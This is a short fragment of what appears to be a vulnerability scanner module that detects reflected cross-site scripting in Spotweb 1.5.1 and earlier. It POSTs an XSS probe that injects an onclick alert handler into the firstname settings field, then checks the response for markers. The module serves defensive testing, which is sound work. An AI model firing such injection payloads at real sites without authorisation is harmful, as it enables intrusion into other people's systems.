...
class Module(Scanner, Http_client):
    ...
    def run(self):
        ...
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data="settingsform[firstname]=pdteam'+onclick='alert(document.domain)\n")
        ...
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='Spotweb <= 1.5.1 - Cross Site Scripting (Reflected) detected', path=path)
            return True
        return False
